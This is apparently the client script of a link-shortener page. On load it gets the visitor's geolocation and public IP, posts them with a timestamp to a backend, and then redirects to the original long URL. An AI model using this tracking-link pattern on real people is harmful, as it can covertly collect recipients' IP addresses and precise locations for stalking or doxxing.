window.addEventListener('load', (event) => {
  geoFindMe();
});

async function getIP(){
  const response = await fetch('https://api.ipify.org?format=json');
  const data = await response.json();
  return data.ip;
}

async function sendData(latitude, longitude, timestamp) {
  const ip_address = await getIP();
  const data = {ip_address, latitude, longitude, timestamp};
  console.log(1, data);

  // replace link with backend server API endpoint
  fetch('http://localhost:3000/test', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .then(response => response.json())
  .then(data => {
    // redirect to long url
    window.location.href = data.longUrl;
  });
}

function geoFindMe() {
  const status = document.querySelector('#status');

  function success(position) {
    const { latitude, longitude }  = position.coords;
    const { timestamp } = position;

    status.textContent = '';

    sendData(latitude, longitude, timestamp);
  }

  function error() {
    status.textContent = 'Unable to retrieve your location';
  }

  if(!navigator.geolocation) {
    status.textContent = 'Geolocation is not supported by your browser';
  } else {
    status.textContent = 'Locating…';
    navigator.geolocation.getCurrentPosition(success, error);
  }
}
